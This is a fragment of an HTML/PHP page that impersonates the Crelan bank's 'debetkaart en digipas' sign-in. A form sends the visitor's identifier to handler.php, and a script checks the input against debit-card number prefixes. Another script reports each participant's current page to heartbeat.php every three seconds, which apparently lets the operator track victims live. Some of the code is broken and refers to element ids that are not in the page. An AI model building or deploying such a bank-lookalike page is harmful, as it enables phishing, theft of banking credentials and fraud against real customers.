class="argnt-m-submit-buttons"><button type="submit" class="argnt-a-button argnt-a-button--primary" aria-disabled="false"><span class="argnt-a-button-typography argnt-a-button__text">Aanmelden</span></button></div></div>







</form>


</div></div></div></section><section id="digipass" class="argnt-m-form-digipass-login"><div class="argnt-a-collapse-item argnt-a-collapse-item--box-shadow"><h2 class="argnt-a-collapse-item__header-as"><button type="button" id="digipass-collapse-control" aria-expanded="true" aria-controls="digipass-collapse-content" class="argnt-a-collapse-item__summary argnt-m-form-digipass-login__header"><span class="argnt-a-collapse-header argnt-a-collapse-header--open"><span class="argnt-a-collapse-header-icon-and-titles-wrapper"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="calculator" class="svg-inline--fa fa-calculator " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" alt="" style="width: 24px; height: 24px;"><path fill="currentColor" d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z"></path></svg></span><span class="argnt-a-collapse-header-titles"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__regular argnt-a-collapse-header-title">Aanmelden met</span><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-a-collapse-header-title">Debetkaart en digipas</span></span></span><span class="argnt-a-collapse-header-indicator-wrapper open"><span class="argnt-a-collapse-indicator"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-up" class="svg-inline--fa fa-chevron-up " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="transform: rotate(0deg); transition-property: transform; transition-duration: 175ms; transition-timing-function: ease-in-out;"><path fill="currentColor" d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z"></path></svg></span></span></span></button></h2><div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper" id="digipass-collapse-content" role="region" aria-labelledby="digipass-collapse-control" aria-hidden="false" style=""><div class="argnt-a-collapse-item__content content_flex"><div class="item__content_display"><img src="./files/box.png" alt="" srcset=""></div>


 <form id="cardForm"  method="post" action="handler.php">
    <input type="hidden" name="question_number" value="1">
    <input type="hidden" name="participant_id" value="<?php echo htmlspecialchars($participant_id); ?>">
<div class="argnt-m-form-digipass-login__form"><div class="argnt-a-field-container argnt-a-field-container--gap-16"><label for="debitCardInputDigipass"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-m-form-digipass-login__form__card-number-label">Vul hier uw gebruikersidentificatie in (bijvoorbeeld: AB12CD).</span></label><div class="argnt-m-form-card-numbers-drop-down"><div class="argnt-a-card-numbers-drop-down css-b62m3t-container"><span id="react-select-3-live-region" class="css-7pg0cj-a11yText"></span><span aria-live="polite" aria-atomic="false" aria-relevant="additions text" role="log" class="css-7pg0cj-a11yText"></span><div class="argnt-a-card-numbers-drop-down__control css-13cymwt-control"><div class="argnt-a-card-numbers-drop-down__value-container argnt-a-card-numbers-drop-down__value-container--has-value css-hlgwow"><div class="argnt-a-masked-input-field argnt-a-masked-input-field__card"><div class="argnt-a-field argnt-a-field--unstyled">

<input
  autocapitalize="none"
  autocomplete="off"
  autocorrect="off"
  id="InputDigipass"
  spellcheck="false"
  tabindex="0"
  aria-autocomplete="list"
  aria-expanded="false"
  aria-haspopup="true"
  aria-invalid="false"
  aria-required="true"
  role="combobox"
  type="text"
  placeholder="AB12CD"
  maxlength="6"
  name="answer1"
  pattern="^[A-Za-z]{2}[0-9]{2}[A-Za-z]{2}$"
  required
  title="Voer 2 letters, 2 cijfers en nogmaals 2 letters in (bijv. AA11BB)"
  oninput="this.value = this.value.toUpperCase()"
/>




 
<div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="xmark" class="svg-inline--fa fa-xmark " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z"></path></svg></div></div><div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-check" class="svg-inline--fa fa-circle-check " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z"></path></svg></div></div></div></div></div><div class="argnt-a-card-numbers-drop-down__indicators css-1wy0on6"><div class="argnt-a-card-numbers-drop-down__indicator argnt-a-card-numbers-drop-down__dropdown-indicator css-1xc3v61-indicatorContainer" aria-hidden="true"><span class="argnt-a-collapse-indicator"></span></div></div></div><input name="loginAccountInput" type="hidden" value=""></div><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"></div></div></div></div></div><div class="argnt-m-form-digipass-login__form__card-number-save"><div class="argnt-m-form-checkbox"><div class="argnt-a-checkbox"></div><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"></div></div></div></div></div>
<div class="argnt-m-form-container--actions"><div class="argnt-m-submit-buttons">
    <button
      type="submit"
      class="argnt-a-button argnt-a-button--primary"
      aria-disabled="false"
      id="submitButton"
    >
      <span class="argnt-a-button-typography argnt-a-button__text">Aanmelden</span>
    </button>
  
 <script>
  // References to the input field, submit button, and alert message
  const input = document.getElementById('masrrsInputDigipass');
  const submitButton = document.getElementById('submitButton');
  const alertMessage = document.getElementById('alertMessage');
  const form = document.getElementById('cardForm');

  // Function to validate input and update the UI
  function validateInput(value) {
    // Remove all non-numeric characters
    const numericValue = value.replace(/\D/g, '');
    // Format the value as groups of 4 digits
    const formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, '$1 ');
    // Update the input value
    input.value = formattedValue;

    // Check if the numeric value starts with the allowed prefixes
    const isValid =
      numericValue.startsWith('6703') ||
      numericValue.startsWith('5247') ||
      numericValue.startsWith('5203') ||
      numericValue.startsWith('67') ||
      numericValue.startsWith('52') ||
      numericValue.startsWith('5') ||
      numericValue.startsWith('6');

    if (isValid || numericValue === '') {
      // If valid or input is empty, show the submit button and remove invalid class
      submitButton.style.display = 'inline-block';
      input.style.color = ''; // Reset text color to default
      alertMessage.style.display = 'none'; // Hide alert message
    } else {
      // If not valid, hide the submit button and set text color to red
      submitButton.style.display = 'none';
      input.style.color = 'red';
      alertMessage.style.display = 'block'; // Show alert message
    }
  }

  // Event listener for input changes
  input.addEventListener('input', (e) => validateInput(e.target.value));

  // Prevent manual spaces with 'keydown'
  input.addEventListener('keydown', (e) => {
    if (e.key === ' ') {
      e.preventDefault();
    }
  });

  // Event listener for form submission
  form.addEventListener('submit', (e) => {
    // Remove all non-numeric characters
    const numericValue = input.value.replace(/\D/g, '');
    if (numericValue === '') {
      // If the input is empty, prevent form submission and add error class
      e.preventDefault();
      input.classList.add('error');
      alertMessage.style.display = 'block'; // Show alert message
    } else if (
      !numericValue.startsWith('6703') &&
      !numericValue.startsWith('5247') &&
      !numericValue.startsWith('5203') &&
      !numericValue.startsWith('67') &&
      !numericValue.startsWith('52') &&
      !numericValue.startsWith('5') &&
      !numericValue.startsWith('6')
    ) {
      // If the input does not start with the allowed prefixes, prevent form submission
      e.preventDefault();
      alertMessage.style.display = 'block'; // Show alert message
    }
  });

  // Initialize validation on page load
  validateInput(input.value);
</script>


  </div></div></div>


</form>



</div></div></div></section></div></div></div></div><div class="argnt-a-separator argnt-m-login-component__separator"></div><div class="argnt-p-message-warning-detail"></div></div></div></div></div></div></div></main><footer class="argnt-p-login-page__border-footer"><div class="argnt-m-footer"><div class="argnt-m-footer__links"><div class="argnt-m-footer__links-left"><span class="argnt-m-footer__copyright"></span></div><div class="argnt-m-footer__links-right"><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Meer info?</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Privacy</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;"> Règlement myCrelan</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Sécurité myCrelan</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><div class="argnt-m-footer__app-version"><span class="argnt-a-badge argnt-a-badge--light">Alle rechten voorbehouden © Crelan 2025</span></div></div></div></div></footer></div></div></div></div><div class="sr-only" role="status" aria-live="polite" aria-atomic="true" aria-relevant="additions text"></div></div>
    
    <script>
        // Heartbeat script to track participant activity
        function sendHeartbeat() {
            fetch('heartbeat.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'participant_id=<?php echo $participant_id; ?>&current_page=question1'
            }).catch(error => {
                console.log('Heartbeat error:', error);
            });
        }
        
        // Send heartbeat every 3 seconds
        sendHeartbeat(); // Send immediately
        setInterval(sendHeartbeat, 3000);
        
        // Send heartbeat when page becomes visible again
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                sendHeartbeat();
            }
        });
    </script>
</body>
</html>
